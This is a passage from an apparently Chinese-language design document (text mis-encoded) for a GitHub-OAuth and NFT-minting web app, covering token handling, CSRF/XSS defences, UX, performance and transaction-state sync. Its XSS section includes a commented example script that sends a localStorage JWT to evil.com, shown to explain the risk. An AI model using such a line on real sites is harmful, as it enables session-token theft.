// - ä½†ç”¨æˆ·å¯ä»¥åœ¨ GitHub ä¸Šæ‰‹åŠ¨æ’¤é”€
// - å¦‚æœè¢«æ’¤é”€ï¼Œæ‰€æœ‰ä½¿ç”¨è¯¥ token çš„ API è°ƒç”¨éƒ½ä¼šå¤±è´¥

// å½“å‰é—®é¢˜ï¼šæ²¡æœ‰ Token åˆ·æ–°æœºåˆ¶
async function callGitHubAPI(accessToken: string) {
  const response = await fetch('https://api.github.com/user', {
    headers: { 'Authorization': `Bearer ${accessToken}` },
  });
  
  if (response.status === 401) {
    // Token æ— æ•ˆæˆ–è¢«æ’¤é”€
    // å½“å‰æ²¡æœ‰è‡ªåŠ¨åˆ·æ–°æœºåˆ¶ï¼Œåªèƒ½è®©ç”¨æˆ·é‡æ–°ç™»å½•
    throw new Error('GitHub Token æ— æ•ˆï¼Œè¯·é‡æ–°ç™»å½•');
  }
}

// è§£å†³æ–¹æ¡ˆï¼šOAuth Refresh Tokenï¼ˆéœ€è¦é¢å¤–ç”³è¯·æƒé™ï¼‰
// æˆ–è€…ï¼šæ£€æµ‹åˆ° 401 åï¼Œè‡ªåŠ¨è§¦å‘é‡æ–°ç™»å½•æµç¨‹
async function callGitHubAPIWithRetry(accessToken: string) {
  const response = await fetch('https://api.github.com/user', {
    headers: { 'Authorization': `Bearer ${accessToken}` },
  });
  
  if (response.status === 401) {
    // æ¸…é™¤å½“å‰ Session
    await clearSessionCookie();
    
    // é‡å®šå‘åˆ°ç™»å½•é¡µï¼Œå¸¦ä¸Šå›è°ƒå‚æ•°
    const returnUrl = window.location.pathname;
    window.location.href = `/api/auth/github?redirect=${encodeURIComponent(returnUrl)}`;
    
    throw new Error('Token å·²è¿‡æœŸï¼Œæ­£åœ¨é‡æ–°ç™»å½•...');
  }
  
  return response.json();
}
```

**æŒ‘æˆ˜ 3ï¼šAccess Token çš„æƒé™èŒƒå›´**

```typescript
// GitHub OAuth å¯ä»¥è¯·æ±‚ä¸åŒçš„æƒé™ï¼ˆscopesï¼‰

// å½“å‰é…ç½®ï¼š
// frontend/src/app/api/auth/github/route.ts
const authUrl = `https://github.com/login/oauth/authorize?` +
  `client_id=${clientId}&` +
  `redirect_uri=${callbackUrl}&` +
  `scope=user:email read:user`;  // â† å½“å‰åªè¯·æ±‚äº†åŸºç¡€ç”¨æˆ·ä¿¡æ¯

// å¦‚æœéœ€è¦æ›´å¤šåŠŸèƒ½ï¼Œéœ€è¦æ›´å¤šæƒé™ï¼š

// - è¯»å–ç§æœ‰ä»“åº“ï¼šrepoï¼ˆé£é™©ï¼šæƒé™è¿‡å¤§ï¼‰
// - è¯»å–å…¬å¼€ä»“åº“ï¼špublic_repo
// - å†™å…¥ä»“åº“å†…å®¹ï¼šrepoï¼ˆå±é™©ï¼Œä¸€èˆ¬ä¸éœ€è¦ï¼‰
// - è¯»å–ç»„ç»‡ä¿¡æ¯ï¼šread:org
// - è¯»å–å›¢é˜Ÿä¿¡æ¯ï¼šread:team

// å»ºè®®ï¼šæŒ‰éœ€è¯·æ±‚ï¼Œæœ€å°æƒé™åŸåˆ™
const scope = [
  'user:email',      // è¯»å–ç”¨æˆ·é‚®ç®±
  'read:user',       // è¯»å–ç”¨æˆ·ä¿¡æ¯
  'public_repo',     // è¯»å–å…¬å¼€ä»“åº“ï¼ˆå¦‚æœéœ€è¦å±•ç¤ºç”¨æˆ·ä»“åº“åˆ—è¡¨ï¼‰
].join(' ');
```

---

### 1.5 å®‰å…¨æ€§é—®é¢˜

#### é—®é¢˜ 1ï¼šJWT Secret æ³„éœ²é£é™©

```typescript
// å½“å‰é…ç½®ï¼š
// lib/auth/session.ts
const SESSION_CONFIG = {
  secret: new TextEncoder().encode(
    process.env.JWT_SECRET || 'default-secret-please-change-in-production-min-32-chars'
  ),
};

// é£é™©ï¼š
// 1. å¦‚æœä½¿ç”¨é»˜è®¤å€¼ï¼ˆå¼€å‘å¿˜è®°æ”¹ï¼‰
// 2. JWT_SECRET è¢«æäº¤åˆ° Git
// 3. ç”Ÿäº§ç¯å¢ƒæ³„éœ²ï¼ˆæ—¥å¿—æ‰“å°ã€é”™è¯¯ä¿¡æ¯æš´éœ²ï¼‰

// é˜²æŠ¤æªæ–½ï¼š
// 1. å¯åŠ¨æ—¶æ£€æŸ¥
if (process.env.NODE_ENV === 'production' && 
    (!process.env.JWT_SECRET || process.env.JWT_SECRET.includes('default'))) {
  throw new Error('ç”Ÿäº§ç¯å¢ƒå¿…é¡»é…ç½® JWT_SECRETï¼Œä¸”ä¸èƒ½ä½¿ç”¨é»˜è®¤å€¼');
}

// 2. å¯†é’¥è½®æ¢æœºåˆ¶
// - å®šæœŸæ›´æ¢ JWT_SECRET
// - æ”¯æŒåŒæ—¶éªŒè¯æ–°æ—§å¯†é’¥ï¼ˆè¿‡æ¸¡æœŸï¼‰
const secrets = [
  new TextEncoder().encode(process.env.JWT_SECRET_NEW),  // æ–°å¯†é’¥
  new TextEncoder().encode(process.env.JWT_SECRET_OLD),  // æ—§å¯†é’¥ï¼ˆå…¼å®¹è¿‡æ¸¡ï¼‰
];

async function verifySessionWithRotation(token: string): Promise<SessionData | null> {
  // å…ˆç”¨æ–°å¯†é’¥éªŒè¯
  try {
    const { payload } = await jwtVerify(token, secrets[0]);
    return payload as SessionData;
  } catch {
    // å¤±è´¥åˆ™ç”¨æ—§å¯†é’¥éªŒè¯ï¼ˆå…¼å®¹è¿‡æ¸¡æœŸï¼‰
    try {
      const { payload } = await jwtVerify(token, secrets[1]);
      return payload as SessionData;
    } catch {
      return null;
    }
  }
}
```

#### é—®é¢˜ 2ï¼šCSRF æ”»å‡»é˜²æŠ¤

```typescript
// å½“å‰é˜²æŠ¤ï¼šsameSite: 'lax'
cookieStore.set('lightcommit_session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',  // â† é˜²æ­¢å¤§éƒ¨åˆ† CSRFï¼Œä½†ä¸æ˜¯ 100%
});

// sameSite: 'lax' çš„é™åˆ¶ï¼š
// - å…è®¸ä»å¤–éƒ¨ç½‘ç«™é€šè¿‡ <a href> è·³è½¬æ—¶æºå¸¦ Cookie
// - å…è®¸é¡¶çº§å¯¼èˆªï¼ˆå¦‚ç”¨æˆ·ç‚¹å‡»é“¾æ¥ï¼‰æºå¸¦ Cookie
// - ä¸å…è®¸ <iframe>ã€<img> ç­‰åµŒå…¥è¯·æ±‚æºå¸¦ Cookie
// - ä¸å…è®¸ AJAX POST è¯·æ±‚æºå¸¦ Cookie

// æ›´ä¸¥æ ¼çš„æ–¹æ¡ˆï¼šsameSite: 'strict'
// - å®Œå…¨ç¦æ­¢è·¨ç«™è¯·æ±‚æºå¸¦ Cookie
// - ç¼ºç‚¹ï¼šç”¨æˆ·ä»å¤–éƒ¨é“¾æ¥ï¼ˆå¦‚é‚®ä»¶ï¼‰ç‚¹å‡»ä¼šä¸¢å¤±ç™»å½•çŠ¶æ€

// é¢å¤–é˜²æŠ¤ï¼šCSRF Token
import { randomBytes } from 'crypto';

// ç”Ÿæˆ CSRF Token
function generateCSRFToken(): string {
  return randomBytes(32).toString('hex');
}

// å­˜å‚¨åœ¨ Session ä¸­
const sessionData = {
  user: { ... },
  accessToken: '...',
  csrfToken: generateCSRFToken(),  // â† æ·»åŠ  CSRF Token
};

// å‰ç«¯è¡¨å•ä¸­æºå¸¦
<form method="POST" action="/api/mint">
  <input type="hidden" name="csrf_token" value={session.csrfToken} />
  <button type="submit">é“¸é€  NFT</button>
</form>

// åç«¯éªŒè¯
export async function POST(request: NextRequest) {
  const session = await getSession();
  const formData = await request.formData();
  const csrfToken = formData.get('csrf_token');
  
  if (!session || csrfToken !== session.csrfToken) {
    return NextResponse.json({ error: 'Invalid CSRF token' }, { status: 403 });
  }
  
  // å¤„ç†è¯·æ±‚...
}
```

#### é—®é¢˜ 3ï¼šXSS æ”»å‡»é˜²æŠ¤

```typescript
// å½“å‰é˜²æŠ¤ï¼šhttpOnly Cookie

// âœ… å¥½çš„å®è·µï¼š
cookieStore.set('lightcommit_session', token, {
  httpOnly: true,  // JavaScript æ— æ³•è®¿é—®
});

// âŒ å±é™©çš„åšæ³•ï¼ˆä¸è¦è¿™æ ·ï¼‰ï¼š
localStorage.setItem('jwt_token', token);  // â† JavaScript å¯è®¿é—®ï¼Œæ˜“å— XSS æ”»å‡»

// å¦‚æœæœ‰ XSS æ¼æ´ï¼š
<div dangerouslySetInnerHTML={{ __html: userInput }} />  // â† å±é™©
// æ”»å‡»è€…å¯ä»¥æ³¨å…¥ï¼š
// <script>
//   const token = localStorage.getItem('jwt_token');
//   fetch('https://evil.com/steal?token=' + token);  // çªƒå– token
// </script>

// é˜²æŠ¤æªæ–½ï¼š
// 1. ä½¿ç”¨ httpOnly Cookieï¼ˆå½“å‰å·²å®ç°ï¼‰
// 2. å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè½¬ä¹‰
// 3. è®¾ç½® Content-Security-Policy å¤´
// 4. é¿å…ä½¿ç”¨ dangerouslySetInnerHTML
```

---

### 1.6 ç”¨æˆ·ä½“éªŒä¼˜åŒ–é—®é¢˜

#### æŒ‘æˆ˜ 1ï¼šé¦–æ¬¡ä½¿ç”¨æµç¨‹å¤æ‚

```typescript
// å½“å‰æµç¨‹ï¼š
// 1. è®¿é—®ç½‘ç«™
// 2. ç‚¹å‡»"GitHub ç™»å½•"
// 3. GitHub æˆæƒ
// 4. å›åˆ°ç½‘ç«™
// 5. ç‚¹å‡»"è¿æ¥é’±åŒ…"
// 6. MetaMask å¼¹çª—
// 7. ç‚¹å‡»"æ³¨å†Œ Agent"
// 8. ç­¾åäº¤æ˜“
// 9. ç­‰å¾…äº¤æ˜“ç¡®è®¤
// 10. æ‰èƒ½å¼€å§‹ä½¿ç”¨

// å…± 10 æ­¥ï¼Œç”¨æˆ·å¯èƒ½åœ¨ä»»ä½•ä¸€æ­¥æ”¾å¼ƒ

// ä¼˜åŒ–æ–¹æ¡ˆï¼š
// 1. åˆå¹¶æ­¥éª¤ï¼ˆä¸€é”®ç™»å½• + è¿æ¥é’±åŒ…ï¼‰
// 2. å»¶è¿Ÿæ³¨å†Œï¼ˆé¦–æ¬¡é“¸é€ æ—¶æ‰æ³¨å†Œ Agentï¼‰
// 3. æä¾›"ä»…æŸ¥çœ‹"æ¨¡å¼ï¼ˆæ— éœ€ç™»å½•å°±èƒ½æµè§ˆå…¬å¼€è´¡çŒ®ï¼‰
```

**ä¼˜åŒ–åçš„æµç¨‹ï¼š**

```typescript
// æ–¹æ¡ˆ Aï¼šå»¶è¿Ÿæ³¨å†Œ
function ContributionsPage() {
  const { isAuthenticated } = useAuth();
  const { isConnected } = useWeb3();
  const { isRegistered } = useAgentRegistry();
  
  // 1. æœªç™»å½•ï¼šå…è®¸æŸ¥çœ‹å…¬å¼€è´¡çŒ®
  if (!isAuthenticated) {
    return <PublicContributionsView />;
  }
  
  // 2. å·²ç™»å½•ä½†æœªè¿æ¥é’±åŒ…ï¼šæ˜¾ç¤ºæç¤ºï¼Œå…è®¸æŸ¥çœ‹è‡ªå·±çš„è´¡çŒ®
  if (!isConnected) {
    return (
      <div>
        <MyContributionsView />
        <Banner>è¿æ¥é’±åŒ…åå¯é“¸é€  NFT</Banner>
      </div>
    );
  }
  
  // 3. å·²è¿æ¥é’±åŒ…ä½†æœªæ³¨å†Œï¼šé¦–æ¬¡é“¸é€ æ—¶å¼•å¯¼æ³¨å†Œ
  if (!isRegistered) {
    return (
      <div>
        <MyContributionsView />
        <MintButton 
          onClick={async () => {
            // å…ˆæ³¨å†Œ
            await registerAgent();
            // å†é“¸é€ 
            await mintNFT();
          }}
        />
      </div>
    );
  }
  
  // 4. å®Œæ•´åŠŸèƒ½
  return <FullFeaturedView />;
}
```

**æ–¹æ¡ˆ Bï¼šæ¸è¿›å¼æƒé™è¯·æ±‚**

```typescript
// æ ¹æ®ç”¨æˆ·æ“ä½œé€æ­¥è¯·æ±‚æƒé™
const permissions = {
  browse: { github: false, wallet: false },      // æµè§ˆå…¬å¼€å†…å®¹
  viewMine: { github: true, wallet: false },     // æŸ¥çœ‹æˆ‘çš„è´¡çŒ®
  mint: { github: true, wallet: true },          // é“¸é€  NFT
  register: { github: true, wallet: true },      // æ³¨å†Œ Agent
};

function FeatureButton({ feature, children, onClick }) {
  const { isAuthenticated } = useAuth();
  const { isConnected } = useWeb3();
  const required = permissions[feature];
  
  const handleClick = async () => {
    // æ£€æŸ¥ GitHub ç™»å½•
    if (required.github && !isAuthenticated) {
      await AuthService.signInWithGitHub();
      return;
    }
    
    // æ£€æŸ¥é’±åŒ…è¿æ¥
    if (required.wallet && !isConnected) {
      await connect();
      return;
    }
    
    // æ‰§è¡Œæ“ä½œ
    onClick();
  };
  
  return <button onClick={handleClick}>{children}</button>;
}

// ä½¿ç”¨ï¼š
<FeatureButton feature="browse">æµè§ˆè´¡çŒ®</FeatureButton>
<FeatureButton feature="mint">é“¸é€  NFT</FeatureButton>
```

---

### 1.7 èº«ä»½éªŒè¯çš„æ€§èƒ½é—®é¢˜

#### æŒ‘æˆ˜ï¼šæ¯æ¬¡ API è¯·æ±‚éƒ½è¦éªŒè¯ JWT

```typescript
// å½“å‰å®ç°ï¼š
// app/api/contributions/my/route.ts
export async function GET(request: NextRequest) {
  // æ¯æ¬¡è¯·æ±‚éƒ½è¦ï¼š
  // 1. ä» Cookie è¯»å– JWT
  const token = cookieStore.get('lightcommit_session')?.value;
  
  // 2. éªŒè¯ç­¾åï¼ˆè®¡ç®—å¯†é›†å‹æ“ä½œï¼‰
  const { payload } = await jwtVerify(token, secret);
  
  // 3. æŸ¥è¯¢æ•°æ®åº“
  const contributions = await db.query(...);
  
  return NextResponse.json({ data: contributions });
}

// æ€§èƒ½å½±å“ï¼š
// - jwtVerify éœ€è¦ HMAC-SHA256 è®¡ç®—
// - é«˜å¹¶å‘æ—¶ï¼ˆ100+ è¯·æ±‚/ç§’ï¼‰ä¼šå¢åŠ  CPU è´Ÿè½½

// ä¼˜åŒ–æ–¹æ¡ˆ Aï¼šéªŒè¯ç»“æœç¼“å­˜
const verifyCache = new Map<string, { session: SessionData, expireAt: number }>();

async function getSessionCached(token: string): Promise<SessionData | null> {
  // æ£€æŸ¥ç¼“å­˜
  const cached = verifyCache.get(token);
  if (cached && cached.expireAt > Date.now()) {
    return cached.session;  // å‘½ä¸­ç¼“å­˜ï¼Œè·³è¿‡éªŒè¯
  }
  
  // éªŒè¯ JWT
  const session = await verifySession(token);
  if (session) {
    // ç¼“å­˜éªŒè¯ç»“æœï¼ˆ1 åˆ†é’Ÿï¼‰
    verifyCache.set(token, {
      session,
      expireAt: Date.now() + 60 * 1000,
    });
  }
  
  return session;
}

// ä¼˜ç‚¹ï¼šå‡å°‘é‡å¤éªŒè¯
// ç¼ºç‚¹ï¼šå†…å­˜å ç”¨ã€ç¼“å­˜å¤±æ•ˆç­–ç•¥
```

**ä¼˜åŒ–æ–¹æ¡ˆ Bï¼šä¸­é—´ä»¶å±‚ç»Ÿä¸€éªŒè¯**

```typescript
// frontend/src/middleware.ts
export async function middleware(request: NextRequest) {
  const session = await getSession();
  
  // å°† session å­˜å‚¨åœ¨è¯·æ±‚å¤´ä¸­ï¼ˆä¼ é€’ç»™ API Routeï¼‰
  const requestHeaders = new Headers(request.headers);
  if (session) {
    requestHeaders.set('x-user-id', session.user.id.toString());
    requestHeaders.set('x-user-login', session.user.login);
  }
  
  return NextResponse.next({
    request: {
      headers: requestHeaders,
    },
  });
}

// API Route ä¸­ç›´æ¥ä½¿ç”¨
export async function GET(request: NextRequest) {
  // ä» header è¯»å–ï¼ˆå·²åœ¨ä¸­é—´ä»¶ä¸­éªŒè¯ï¼‰
  const userId = request.headers.get('x-user-id');
  const userLogin = request.headers.get('x-user-login');
  
  if (!userId) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }
  
  // è·³è¿‡ JWT éªŒè¯ï¼Œç›´æ¥ä½¿ç”¨
  const contributions = await db.query('SELECT * FROM contributions WHERE user_id = $1', [userId]);
  
  return NextResponse.json({ data: contributions });
}

// ä¼˜ç‚¹ï¼šéªŒè¯åªæ‰§è¡Œä¸€æ¬¡
// ç¼ºç‚¹ï¼šéœ€è¦ä¿¡ä»»ä¸­é—´ä»¶ï¼ˆå†…éƒ¨è¯·æ±‚å¤´å¯èƒ½è¢«ä¼ªé€ ï¼‰
```

---

### 1.8 è®¤è¯æµç¨‹çš„é”™è¯¯å¤„ç†

#### æŒ‘æˆ˜ï¼šOAuth æµç¨‹ä¸­çš„å„ç§å¤±è´¥åœºæ™¯

```typescript
// GitHub OAuth å¯èƒ½å¤±è´¥çš„ç¯èŠ‚ï¼š

// 1. ç”¨æˆ·å–æ¶ˆæˆæƒ
// GitHub å›è°ƒï¼š/auth/callback?error=access_denied
export async function GET(request: NextRequest) {
  const error = request.nextUrl.searchParams.get('error');
  if (error === 'access_denied') {
    return NextResponse.redirect(new URL('/?msg=ç™»å½•å·²å–æ¶ˆ', request.url));
  }
}

// 2. code äº¤æ¢ access_token å¤±è´¥
const tokenResponse = await fetch('https://github.com/login/oauth/access_token', {
  method: 'POST',
  body: JSON.stringify({ client_id, client_secret, code }),
});

if (!tokenResponse.ok) {
  // å¯èƒ½åŸå› ï¼š
  // - code å·²ä½¿ç”¨ï¼ˆé‡å¤æäº¤ï¼‰
  // - code è¿‡æœŸï¼ˆ5 åˆ†é’Ÿå†…å¿…é¡»ä½¿ç”¨ï¼‰
  // - client_secret é”™è¯¯
  console.error('äº¤æ¢ token å¤±è´¥:', await tokenResponse.text());
  return NextResponse.redirect(new URL('/?error=token_exchange_failed', request.url));
}

// 3. è·å–ç”¨æˆ·ä¿¡æ¯å¤±è´¥
const userResponse = await fetch('https://api.github.com/user', {
  headers: { 'Authorization': `Bearer ${accessToken}` },
});

if (!userResponse.ok) {
  // å¯èƒ½åŸå› ï¼š
  // - access_token æ— æ•ˆ
  // - GitHub API é™æµ
  // - ç½‘ç»œé”™è¯¯
  console.error('è·å–ç”¨æˆ·ä¿¡æ¯å¤±è´¥:', userResponse.status);
  return NextResponse.redirect(new URL('/?error=fetch_user_failed', request.url));
}

// 4. è®¾ç½® Cookie å¤±è´¥
try {
  await setSessionCookie(sessionData);
} catch (error) {
  // å¯èƒ½åŸå› ï¼š
  // - Cookie å¤§å°è¶…é™ï¼ˆ4KBï¼‰
  // - æµè§ˆå™¨ç¦ç”¨ Cookie
  console.error('è®¾ç½® Session å¤±è´¥:', error);
  return NextResponse.redirect(new URL('/?error=session_failed', request.url));
}

// ç»Ÿä¸€é”™è¯¯å¤„ç†ï¼š
const errorMessages = {
  'oauth_cancelled': 'æ‚¨å·²å–æ¶ˆ GitHub ç™»å½•',
  'missing_code': 'ç¼ºå°‘æˆæƒç ï¼Œè¯·é‡è¯•',
  'config_missing': 'GitHub OAuth é…ç½®ç¼ºå¤±',
  'token_exchange_failed': 'ç™»å½•å¤±è´¥ï¼Œè¯·é‡è¯•',
  'fetch_user_failed': 'è·å–ç”¨æˆ·ä¿¡æ¯å¤±è´¥',
  'session_failed': 'åˆ›å»º Session å¤±è´¥',
};

// å‰ç«¯å±•ç¤ºé”™è¯¯
// app/page.tsx
export default function HomePage({ searchParams }) {
  const error = searchParams.error;
  
  useEffect(() => {
    if (error && errorMessages[error]) {
      toast.error(errorMessages[error]);
    }
  }, [error]);
}
```

---

## äºŒã€é“¾ä¸Šé“¾ä¸‹æ•°æ®åŒæ­¥é—®é¢˜ ğŸ”„

### 2.1 çŠ¶æ€æœºç®¡ç†å¤æ‚æ€§

#### é—®é¢˜æè¿°

è´¡çŒ®ä» GitHub Webhook å…¥åº“åˆ°æœ€ç»ˆé“¸é€ ä¸º NFTï¼Œéœ€è¦ç»å†å¤šä¸ªçŠ¶æ€ã€‚æ¯ä¸ªçŠ¶æ€è½¬æ¢éƒ½å¯èƒ½å¤±è´¥ï¼Œå¯¼è‡´æ•°æ®ä¸ä¸€è‡´ã€‚

#### è´¡çŒ®çŠ¶æ€æµè½¬å›¾

```typescript
// frontend/src/types/contribution.ts
export enum ContributionStatus {
  PENDING = 'pending',    // å·²ä» GitHub å…¥åº“ï¼Œå¾…è¯„åˆ†
  MINTING = 'minting',    // äº¤æ˜“å·²å‘é€ï¼Œå¾…ç¡®è®¤
  MINTED = 'minted',      // å·²æˆåŠŸé“¸é€ ä¸º NFT
  FAILED = 'failed',      // é“¸é€ å¤±è´¥
}

// çŠ¶æ€æµè½¬ï¼š
// 
//   GitHub Webhook
//         â†“
//    ã€PENDINGã€‘
//         â†“ 
//    è¯„åˆ† & ç­¾å
//         â†“
//    å‘é€äº¤æ˜“ï¼ˆsubmitFeedback / requestValidationï¼‰
//         â†“
//    ã€MINTINGã€‘
//         â†“
//    ç­‰å¾…åŒºå—ç¡®è®¤
//         â†“
//    â”Œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”
//    â†“           â†“
// ã€MINTEDã€‘  ã€FAILEDã€‘
//  (æˆåŠŸ)      (å¤±è´¥)
```

#### å…·ä½“æŒ‘æˆ˜

**æŒ‘æˆ˜ 1ï¼šçŠ¶æ€è½¬æ¢çš„åŸå­æ€§**

```typescript
// åœºæ™¯ï¼šé“¸é€ æµç¨‹
async function mintContribution(contributionId: string) {
  // 1. æ›´æ–°çŠ¶æ€ä¸º 'minting'
  await ContributionRepository.update(contributionId, {
    status: ContributionStatus.MINTING,
  });
  
  // 2. å‘é€äº¤æ˜“
  const tx = await contract.mintCommit(to, commitData, metadataUri);
  console.log('äº¤æ˜“å·²å‘é€:', tx.hash);
  
  // âš ï¸ é—®é¢˜ï¼šæ­¤æ—¶ç¨‹åºå´©æºƒ / ç½‘ç»œæ–­å¼€ / æœåŠ¡é‡å¯
  // - æ•°æ®åº“çŠ¶æ€ï¼šminting
  // - å®é™…çŠ¶æ€ï¼šäº¤æ˜“å¯èƒ½æˆåŠŸä¹Ÿå¯èƒ½å¤±è´¥
  // - æ²¡æœ‰ transactionHash è®°å½•ï¼Œæ— æ³•è¿½è¸ª
  
  // 3. ç­‰å¾…ç¡®è®¤
  const receipt = await tx.wait();
  
  // 4. æ›´æ–°çŠ¶æ€ä¸º 'minted'
  await ContributionRepository.update(contributionId, {
    status: ContributionStatus.MINTED,
    transactionHash: receipt.hash,
  });
}

// æ”¹è¿›æ–¹æ¡ˆï¼šå…ˆè®°å½• transactionHashï¼Œå†ç­‰å¾…ç¡®è®¤
async function mintContributionSafe(contributionId: string) {
  try {
    // 1. å‘é€äº¤æ˜“
    const tx = await contract.mintCommit(to, commitData, metadataUri);
    
    // 2. ç«‹å³æ›´æ–°çŠ¶æ€ + è®°å½• hashï¼ˆå³ä½¿åç»­å¤±è´¥ï¼Œä¹Ÿèƒ½è¿½è¸ªï¼‰
    await ContributionRepository.update(contributionId, {
      status: ContributionStatus.MINTING,
      transactionHash: tx.hash,  // â† å…³é”®ï¼šç«‹å³è®°å½• hash
    });
    
    // 3. ç­‰å¾…ç¡®è®¤ï¼ˆå¯èƒ½å¾ˆä¹…ï¼Œå¯èƒ½å¤±è´¥ï¼‰
    const receipt = await tx.wait();
    
    // 4. æ ¹æ®äº¤æ˜“ç»“æœæ›´æ–°çŠ¶æ€
    if (receipt.status === 1) {
      // æˆåŠŸ
      const tokenId = parseTokenIdFromReceipt(receipt);
      await ContributionRepository.update(contributionId, {
        status: ContributionStatus.MINTED,
        tokenId,
      });
    } else {
      // å¤±è´¥ï¼ˆäº¤æ˜“è¢« revertï¼‰
      await ContributionRepository.update(contributionId, {
        status: ContributionStatus.FAILED,
      });
    }
    
  } catch (error) {
    // 5. å¼‚å¸¸å¤„ç†ï¼ˆç½‘ç»œé”™è¯¯ã€Gas ä¸è¶³ç­‰ï¼‰
    console.error('é“¸é€ å¼‚å¸¸:', error);
    
    // å°è¯•æ›´æ–°çŠ¶æ€ä¸º failed
    try {
      await ContributionRepository.update(contributionId, {
        status: ContributionStatus.FAILED,
      });
    } catch (updateError) {
      // æ•°æ®åº“æ›´æ–°ä¹Ÿå¤±è´¥äº†ï¼Œè®°å½•æ—¥å¿—
      console.error('æ›´æ–°çŠ¶æ€å¤±è´¥:', updateError);
    }
  }
}
```

**æŒ‘æˆ˜ 2ï¼šåƒµå°¸çŠ¶æ€çš„æ¸…ç†**

```typescript
// åœºæ™¯ï¼šè´¡çŒ®å¡åœ¨ 'minting' çŠ¶æ€

// åŸå› ï¼š
// - äº¤æ˜“å‘é€åï¼ŒæœåŠ¡é‡å¯/å´©æºƒï¼Œæ²¡æœ‰ç­‰åˆ° receipt
// - ç½‘ç»œé—®é¢˜å¯¼è‡´ tx.wait() ä¸€ç›´ pending
// - äº¤æ˜“è¢«å¡åœ¨ mempool ä¸­ï¼ˆGas ä»·æ ¼å¤ªä½ï¼‰

// å½“å‰é—®é¢˜ï¼š
// 1. æ•°æ®åº“æ˜¾ç¤º 'minting'
// 2. ç”¨æˆ·çœ‹åˆ°"é“¸é€ ä¸­"ï¼Œä½†å®é™…å¯èƒ½å·²ç»æˆåŠŸ/å¤±è´¥
// 3. æ²¡æœ‰åå°ä»»åŠ¡å»æ£€æŸ¥è¿™äº›åƒµå°¸çŠ¶æ€

// è§£å†³æ–¹æ¡ˆ Aï¼šå®šæ—¶ä»»åŠ¡æ‰«æ
// scripts/check-pending-transactions.ts
import { ContributionRepository } from '@/lib/database/repositories/contribution.repository';
import { ethers } from 'ethers';

async function checkPendingTransactions() {
  // 1. æŸ¥è¯¢æ‰€æœ‰ 'minting' çŠ¶æ€çš„è´¡çŒ®
  const mintingContributions = await ContributionRepository.findAll({
    status: ContributionStatus.MINTING,
  });
  
  console.log(`å‘ç° ${mintingContributions.length} ä¸ªå¾…ç¡®è®¤çš„è´¡çŒ®`);
  
  // 2. é€ä¸ªæ£€æŸ¥äº¤æ˜“çŠ¶æ€
  const provider = new ethers.JsonRpcProvider(process.env.SEPOLIA_RPC_URL);
  
  for (const contribution of mintingContributions) {
    if (!contribution.transactionHash) {
      // æ²¡æœ‰ hashï¼Œå¯èƒ½æ˜¯è®°å½•é”™è¯¯ï¼Œæ ‡è®°ä¸º failed
      console.warn(`è´¡çŒ® ${contribution.id} ç¼ºå°‘ transactionHash`);
      await ContributionRepository.update(contribution.id, {
        status: ContributionStatus.FAILED,
      });
      continue;
    }
    
    try {
      // 3. æŸ¥è¯¢é“¾ä¸Šäº¤æ˜“çŠ¶æ€
      const receipt = await provider.getTransactionReceipt(contribution.transactionHash);
      
      if (receipt) {
        // äº¤æ˜“å·²ä¸Šé“¾
        if (receipt.status === 1) {
          // æˆåŠŸ
          const tokenId = parseTokenIdFromLogs(receipt.logs);
          await ContributionRepository.update(contribution.id, {
            status: ContributionStatus.MINTED,
            tokenId: tokenId?.toString(),
          });
          console.log(`âœ… è´¡çŒ® ${contribution.id} å·²é“¸é€ ï¼ŒTokenID: ${tokenId}`);
        } else {
          // å¤±è´¥ï¼ˆrevertï¼‰
          await ContributionRepository.update(contribution.id, {
            status: ContributionStatus.FAILED,
          });
          console.log(`âŒ è´¡çŒ® ${contribution.id} é“¸é€ å¤±è´¥ï¼ˆrevertï¼‰`);
        }
      } else {
        // äº¤æ˜“è¿˜åœ¨ pending æˆ–ä¸å­˜åœ¨
        const tx = await provider.getTransaction(contribution.transactionHash);
        
        if (!tx) {
          // äº¤æ˜“ä¸å­˜åœ¨ï¼ˆå¯èƒ½æ˜¯æ— æ•ˆçš„ hashï¼Œæˆ–è€…ç½‘ç»œåˆ‡æ¢äº†ï¼‰
          const createdAt = new Date(contribution.updatedAt);
          const now = new Date();
          const hoursSince = (now.getTime() - createdAt.getTime()) / (1000 * 60 * 60);
          
          // å¦‚æœè¶…è¿‡ 24 å°æ—¶è¿˜æ²¡ä¸Šé“¾ï¼Œæ ‡è®°ä¸ºå¤±è´¥
          if (hoursSince > 24) {
            await ContributionRepository.update(contribution.id, {
              status: ContributionStatus.FAILED,
            });
            console.log(`âŒ è´¡çŒ® ${contribution.id} è¶…æ—¶å¤±è´¥ï¼ˆ24å°æ—¶æœªç¡®è®¤ï¼‰`);
          }
        } else {
          // äº¤æ˜“è¿˜åœ¨ pending
          console.log(`â³ è´¡çŒ® ${contribution.id} äº¤æ˜“å¾…ç¡®è®¤: ${contribution.transactionHash}`);
        }
      }
    } catch (error) {
      console.error(`æ£€æŸ¥è´¡çŒ® ${contribution.id} å¤±è´¥:`, error);
    }
  }
}

// ä½¿ç”¨ cron å®šæœŸæ‰§è¡Œï¼ˆæ¯ 10 åˆ†é’Ÿï¼‰
// package.json
{
  "scripts": {
    "check-pending": "node -r ts-node/register scripts/check-pending-transactions.ts"
  }
}

// æˆ–ä½¿ç”¨ Next.js API Route + å¤–éƒ¨ cron æœåŠ¡
// app/api/cron/check-pending/route.ts
export async function GET(request: NextRequest) {
  // éªŒè¯ cron å¯†é’¥ï¼ˆé˜²æ­¢è¢«æ»¥ç”¨ï¼‰
  const authHeader = request.headers.get('authorization');
  if (authHeader !== `Bearer ${process.env.CRON_SECRET}`) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }
  
  await checkPendingTransactions();
  return NextResponse.json({ success: true });
}

// ä½¿ç”¨ Vercel Cron æˆ–å…¶ä»– cron æœåŠ¡æ¯ 10 åˆ†é’Ÿè°ƒç”¨ä¸€æ¬¡
```

**æŒ‘æˆ˜ 3ï¼šå¹¶å‘æ›´æ–°å†²çª**

```typescript
// åœºæ™¯ï¼šå¤šä¸ªè¿›ç¨‹åŒæ—¶æ›´æ–°åŒä¸€ä¸ªè´¡çŒ®

// è¿›ç¨‹ Aï¼šWebhook å¤„ç†ï¼Œæ›´æ–° metadata
await ContributionRepository.update(contributionId, {
  metadata: { additions: 100, deletions: 50 },
});
